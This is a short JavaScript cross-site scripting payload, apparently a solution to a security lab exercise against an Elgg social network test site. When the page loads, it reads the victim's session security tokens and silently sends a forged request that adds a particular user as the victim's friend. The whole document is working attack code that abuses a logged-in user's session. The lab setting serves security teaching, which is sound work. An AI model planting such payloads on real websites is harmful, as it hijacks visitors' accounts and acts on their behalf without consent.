<script type="text/javascript">
window.onload=function() {

	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Construct the HTTP request to add you as a friend.
	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=53&"+ts+token; //FILL IN

//Create and send Ajax request to add friend
	var Ajax=null;
	Ajax=new XMLHttpRequest();
	Ajax.open("GET", sendurl, true);
	Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
}
</script>
